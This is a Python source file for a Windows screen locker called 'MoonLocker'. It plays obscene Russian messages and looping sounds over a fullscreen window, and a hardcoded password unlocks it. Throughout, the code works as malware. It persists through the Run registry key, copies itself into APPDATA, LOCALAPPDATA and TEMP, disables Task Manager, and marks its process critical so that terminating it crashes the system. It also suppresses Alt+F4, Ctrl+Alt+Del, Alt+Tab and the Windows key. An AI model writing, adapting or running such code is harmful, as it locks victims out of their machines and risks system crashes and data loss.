import tkinter as tk
from PIL import Image, ImageTk
import requests
from io import BytesIO
import random
import pygame
import os
import ctypes
import keyboard
import winreg as reg
import sys
import threading
import math
import shutil

script_path = os.path.abspath(__file__)

def add_to_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Zaluper", 0, reg.REG_SZ, sys.executable + " " + script_path)
        reg.CloseKey(key)
    except:
        pass

def remove_from_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(key, "Zaluper")
        reg.CloseKey(key)
    except:
        pass

def spread_copies():
    locs = [
        os.path.join(os.environ.get('APPDATA', ''), 'zaluper_backup.py'),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'zaluper_sys.py'),
        os.path.join(os.environ.get('TEMP', ''), 'zaluper_temp.py'),
    ]
    for loc in locs:
        try:
            if not os.path.exists(loc):
                shutil.copy(script_path, loc)
        except:
            pass

def block_taskmgr():
    try:
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
    except:
        pass

def unblock_taskmgr():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 0)
        reg.CloseKey(key)
    except:
        pass

def watchdog():
    import time
    while True:
        try:
            time.sleep(5)
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        except:
            pass

add_to_startup()
spread_copies()
block_taskmgr()
threading.Thread(target=watchdog, daemon=True).start()

pygame.mixer.init()
sound_folder = "sounds"
sound_files = ["fart.mp3", "lolo.mp3", "skibidi.mp3"]
current_volume = 0.5
sounds = []
for f in sound_files:
    try:
        s = pygame.mixer.Sound(os.path.join(sound_folder, f))
        s.set_volume(current_volume)
        s.play(-1)
        sounds.append(s)
    except:
        pass

try:
    pygame.mixer.music.load("fart.mp3")
    pygame.mixer.music.set_volume(current_volume)
    pygame.mixer.music.play(-1)
except:
    pass

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.overrideredirect(True)
width, height = root.winfo_screenwidth(), root.winfo_screenheight()

def keep_on_top():
    root.attributes('-topmost', True)
    root.lift()
    root.focus_force()
    root.after(100, keep_on_top)
keep_on_top()


cockroach_urls = [
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ0itMdf6w_WnPp77QY9Vj6a74hKtjp4p0iTw&s",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSqquViuVntXakRPfso52c9tW6uPN-q1HKgWg&s",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGRx3AI95GBoq-w9JyGhk83Yptsgpffw_t3g&s",
]
fart_urls = [
    "https://em-content.zobj.net/source/apple/391/dashing-away_1f4a8.png",
    "https://em-content.zobj.net/source/apple/391/cloud_2601-fe0f.png",
    "https://em-content.zobj.net/source/apple/391/wind-face_1f32c-fe0f.png",
]
poop_url = "https://em-content.zobj.net/source/apple/391/pile-of-poo_1f4a9.png"
skull_url = "https://em-content.zobj.net/source/apple/391/skull_1f480.png"
fire_url = "https://em-content.zobj.net/source/apple/391/fire_1f525.png"
clown_url = "https://em-content.zobj.net/source/apple/391/clown-face_1f921.png"
devil_url = "https://em-content.zobj.net/source/apple/391/smiling-face-with-horns_1f608.png"
bg_url = "https://i1.sndcdn.com/artworks-432qAz1vPtD5ibk2-YIz0Gg-t500x500.jpg"

def load_img(url, size):
    try:
        r = requests.get(url, timeout=5)
        img = Image.open(BytesIO(r.content)).convert("RGBA").resize(size)
        return ImageTk.PhotoImage(img)
    except:
        return None

cockroach_imgs = [img for img in [load_img(u, (100, 60)) for u in cockroach_urls] if img]
fart_imgs = [img for img in [load_img(u, (80, 80)) for u in fart_urls] if img]
poop_img = load_img(poop_url, (60, 60))
skull_img = load_img(skull_url, (90, 90))
fire_img = load_img(fire_url, (70, 70))
clown_img = load_img(clown_url, (100, 100))
devil_img = load_img(devil_url, (80, 80))
bg_img = load_img(bg_url, (width, height))

canvas = tk.Canvas(root, width=width, height=height, highlightthickness=0, bg="black")
canvas.pack(fill="both", expand=True)
if bg_img:
    canvas.create_image(0, 0, image=bg_img, anchor="nw")

title = canvas.create_text(width//2, 80, text="💀 MoonLocker 💀", font=("Impact", 55, "bold"), fill="red")
subtitle = canvas.create_text(width//2, 150, text="eralp.mom", font=("Arial", 28, "bold"), fill="yellow")

def animate_title():
    colors = ["red", "yellow", "lime", "cyan", "magenta", "white", "orange", "#ff00ff"]
    canvas.itemconfig(title, fill=random.choice(colors))
    canvas.itemconfig(subtitle, fill=random.choice(colors))
    root.after(80, animate_title)
animate_title()


class Cockroach:
    def __init__(s, c):
        s.c, s.x, s.y = c, random.randint(0, width), random.randint(0, height)
        s.sx, s.sy = random.choice([-18,-15,15,18]), random.choice([-18,-15,15,18])
        s.img = random.choice(cockroach_imgs) if cockroach_imgs else None
        s.id = c.create_image(s.x, s.y, image=s.img) if s.img else None
    def move(s):
        if not s.id: return
        s.x += s.sx + random.randint(-4,4)
        s.y += s.sy + random.randint(-4,4)
        if s.x <= 0 or s.x >= width: s.sx = -s.sx
        if s.y <= 0 or s.y >= height: s.sy = -s.sy
        s.c.coords(s.id, s.x, s.y)

class Fart:
    def __init__(s, c):
        s.c, s.x, s.y = c, random.randint(0, width), random.randint(0, height)
        s.sx, s.sy = random.choice([-12,-8,8,12]), random.choice([-12,-8,8,12])
        s.img = random.choice(fart_imgs) if fart_imgs else None
        s.id = c.create_image(s.x, s.y, image=s.img) if s.img else None
        s.w = 0
    def move(s):
        if not s.id: return
        s.w += 0.2
        s.x += s.sx + math.sin(s.w)*5
        s.y += s.sy + math.cos(s.w)*5
        if s.x <= 0 or s.x >= width: s.sx = -s.sx
        if s.y <= 0 or s.y >= height: s.sy = -s.sy
        s.c.coords(s.id, s.x, s.y)

class Poop:
    def __init__(s, c):
        s.c, s.x, s.y = c, random.randint(0, width), random.randint(-500, 0)
        s.sy, s.sx = random.randint(25, 40), random.randint(-8, 8)
        s.id = c.create_image(s.x, s.y, image=poop_img) if poop_img else None
    def move(s):
        if not s.id: return
        s.y += s.sy
        s.x += s.sx
        if s.y > height + 50:
            s.y, s.x = random.randint(-300, 0), random.randint(0, width)
        s.c.coords(s.id, s.x, s.y)

class Skull:
    def __init__(s, c):
        s.c, s.x, s.y = c, random.randint(0, width), random.randint(0, height)
        s.a, s.sp = random.uniform(0, 6.28), random.randint(8, 15)
        s.id = c.create_image(s.x, s.y, image=skull_img) if skull_img else None
    def move(s):
        if not s.id: return
        s.a += random.uniform(-0.3, 0.3)
        s.x += math.cos(s.a)*s.sp
        s.y += math.sin(s.a)*s.sp
        if s.x < 0: s.x = width
        if s.x > width: s.x = 0
        if s.y < 0: s.y = height
        if s.y > height: s.y = 0
        s.c.coords(s.id, s.x, s.y)

class Fire:
    def __init__(s, c):
        s.c, s.x, s.y = c, random.randint(0, width), height + 50
        s.sy, s.life = random.randint(-20, -10), random.randint(50, 150)
        s.id = c.create_image(s.x, s.y, image=fire_img) if fire_img else None
    def move(s):
        if not s.id: return
        s.y += s.sy
        s.x += random.randint(-3, 3)
        s.life -= 1
        if s.life <= 0 or s.y < -50:
            s.y, s.x, s.life = height + 50, random.randint(0, width), random.randint(50, 150)
        s.c.coords(s.id, s.x, s.y)

class Clown:
    def __init__(s, c):
        s.c, s.x, s.y = c, random.randint(0, width), random.randint(0, height)
        s.sx, s.sy = random.choice([-10,-7,7,10]), random.choice([-10,-7,7,10])
        s.id = c.create_image(s.x, s.y, image=clown_img) if clown_img else None
    def move(s):
        if not s.id: return
        s.x += s.sx
        s.y += s.sy
        if s.x <= 0 or s.x >= width: s.sx = -s.sx
        if s.y <= 0 or s.y >= height: s.sy = -s.sy
        s.c.coords(s.id, s.x, s.y)

class Devil:
    def __init__(s, c):
        s.c, s.x, s.y = c, random.randint(0, width), random.randint(0, height)
        s.a, s.sp = random.uniform(0, 6.28), random.randint(6, 12)
        s.id = c.create_image(s.x, s.y, image=devil_img) if devil_img else None
    def move(s):
        if not s.id: return
        s.a += 0.1
        s.x += math.cos(s.a)*s.sp
        s.y += math.sin(s.a)*s.sp
        if s.x < 0: s.x = width
        if s.x > width: s.x = 0
        if s.y < 0: s.y = height
        if s.y > height: s.y = 0
        s.c.coords(s.id, s.x, s.y)


class FlyingText:
    def __init__(s, c):
        s.c = c
        s.texts = ["ТЕБЕ ПИЗДА 💀", "СОСИ ХУЙ", "ЖОПА МИРА", "ЕБАТЬ ХАОС", "ЗАЛУПА DETECTED",
            "RIP ТВОЙ ПК", "СКИБИДИ ТУАЛЕТ 🚽", "СИГМА ВИРУС", "OHIO MOMENT", "GYATT 🍑",
            "💀💀💀", "🔥🔥🔥", "RIZZ: -999", "NO BITCHES?", "L + RATIO", "SKILL ISSUE",
            "ПЕРДЁЖ АТАКУЕТ 💨", "КАКАШКА ЛЕТИТ 💩", "ТЫ КЛОУН 🤡", "ДЬЯВОЛ 😈", "KRISRUMMER"]
        s.x, s.y = random.randint(0, width), random.randint(0, height)
        s.sx, s.sy = random.choice([-12,-10,10,12]), random.choice([-12,-10,10,12])
        s.colors = ["red", "yellow", "lime", "cyan", "magenta", "orange", "#ff00ff", "white"]
        s.id = c.create_text(s.x, s.y, text=random.choice(s.texts), font=("Impact", random.randint(25,55), "bold"), fill=random.choice(s.colors))
    def move(s):
        s.x += s.sx
        s.y += s.sy
        if s.x <= 0 or s.x >= width: s.sx = -s.sx
        if s.y <= 0 or s.y >= height: s.sy = -s.sy
        s.c.coords(s.id, s.x, s.y)
        if random.random() < 0.2:
            s.c.itemconfig(s.id, fill=random.choice(s.colors))

cockroaches = [Cockroach(canvas) for _ in range(120)]
farts = [Fart(canvas) for _ in range(100)]
poops = [Poop(canvas) for _ in range(150)]
skulls = [Skull(canvas) for _ in range(50)]
fires = [Fire(canvas) for _ in range(60)]
clowns = [Clown(canvas) for _ in range(30)]
devils = [Devil(canvas) for _ in range(25)]
texts = [FlyingText(canvas) for _ in range(50)]

wrong_attempts = [0]
panic_level = [1]

def check_input(event):
    global current_volume
    pw = entry.get().lower().strip()
    if pw == "zalupa":
        remove_from_startup()
        unblock_taskmgr()
        pygame.mixer.music.stop()
        for s in sounds: s.stop()
        try: ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
        except: pass
        root.destroy()
        sys.exit()
    else:
        wrong_attempts[0] += 1
        current_volume = min(current_volume + 0.15, 1.0)
        pygame.mixer.music.set_volume(current_volume)
        for s in sounds: s.set_volume(current_volume)
        if wrong_attempts[0] % 2 == 0:
            for _ in range(15):
                cockroaches.append(Cockroach(canvas))
                poops.append(Poop(canvas))
                farts.append(Fart(canvas))
            for _ in range(5):
                texts.append(FlyingText(canvas))
                skulls.append(Skull(canvas))
            panic_level[0] = min(panic_level[0] + 0.7, 6)
        msgs = ["НЕПРАВИЛЬНО ЛОШАРА! 💀", "НЕТ БЛЯТЬ! 🤡", "СОСИ ХУЙ!", "SKILL ISSUE! 💨", "L + RATIO! 💩", "ПЕРДЁЖ УСИЛИВАЕТСЯ!"]
        err = canvas.create_text(width//2, height//2, text=random.choice(msgs), font=("Impact", 90, "bold"), fill="red")
        root.after(600, lambda: canvas.delete(err))
        entry.delete(0, tk.END)

panic_colors = ["white", "red", "black", "yellow", "lime", "magenta", "cyan", "orange", "#ff00ff"]

def panic_effect():
    if random.random() < 0.5 * panic_level[0]:
        canvas.configure(bg=random.choice(panic_colors))
    if random.random() < 0.3 * panic_level[0]:
        x, y, sz = random.randint(0, width), random.randint(0, height), random.randint(150, 500)
        fl = canvas.create_rectangle(x, y, x+sz, y+sz, fill=random.choice(panic_colors), outline="")
        root.after(40, lambda: canvas.delete(fl))
    if random.random() < 0.25 * panic_level[0]:
        ln = canvas.create_line(random.randint(0,width), random.randint(0,height), random.randint(0,width), random.randint(0,height), fill=random.choice(panic_colors), width=random.randint(3,15))
        root.after(80, lambda: canvas.delete(ln))
    root.after(max(10, int(25 / panic_level[0])), panic_effect)

def screen_shake():
    if random.random() < 0.4 * panic_level[0]:
        root.geometry(f"+{random.randint(-15,15)}+{random.randint(-15,15)}")
        root.after(40, lambda: root.geometry("+0+0"))
    root.after(80, screen_shake)

def update():
    for o in cockroaches + farts + poops + skulls + fires + clowns + devils + texts: o.move()
    root.after(max(5, int(12 / panic_level[0])), update)


entry_frame = tk.Frame(root, bg="black")
entry_frame.place(x=width//2-250, y=height-150, width=500, height=100)
canvas.create_text(width//2, height-180, text="🔐 ВВЕДИ ПАРОЛЬ ЧТОБЫ ВЫЖИТЬ 🔐", font=("Impact", 26, "bold"), fill="red")
entry = tk.Entry(entry_frame, font=("Arial", 26, "bold"), justify="center", bg="black", fg="lime", insertbackground="lime", relief="solid", bd=4)
entry.pack(fill="both", expand=True, padx=10, pady=10)
entry.bind("<Return>", check_input)
entry.focus_set()

hint = canvas.create_text(width//2, height-65, text="Подсказка: это не 'password' 😈", font=("Arial", 18), fill="gray")
def change_hint():
    hints = ["Подсказка: это не 'password' 😈", "Подсказка: 6 букв", "Подсказка: начинается на 'з'", "Подсказка: ХАХАХА НЕТ 🤡", "Подсказка: рифмуется с 'тупа'"]
    canvas.itemconfig(hint, text=random.choice(hints))
    root.after(4000, change_hint)
change_hint()

def insert_nonsense():
    entry.delete(0, tk.END)
    entry.insert(tk.END, random.choice(["СОСИ ХУЙ 💀", "ТЕБЕ ПИЗДА 💩", "ХАХАХАХА 🤡", "SKILL ISSUE 💨", "L + RATIO", "💀💀💀", "ПЕРДЁЖ АТАКУЕТ"]))

panic_effect()
screen_shake()
update()

root.protocol("WM_DELETE_WINDOW", lambda: None)
try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
except: pass

keyboard.block_key('windows')
keyboard.add_hotkey('alt+f4', insert_nonsense, suppress=True)
keyboard.add_hotkey('ctrl+alt+delete', insert_nonsense, suppress=True)
keyboard.add_hotkey('ctrl+shift+esc', insert_nonsense, suppress=True)
keyboard.add_hotkey('alt+tab', insert_nonsense, suppress=True)
keyboard.add_hotkey('escape', insert_nonsense, suppress=True)
keyboard.add_hotkey('ctrl+w', insert_nonsense, suppress=True)
keyboard.add_hotkey('ctrl+q', insert_nonsense, suppress=True)

root.mainloop()
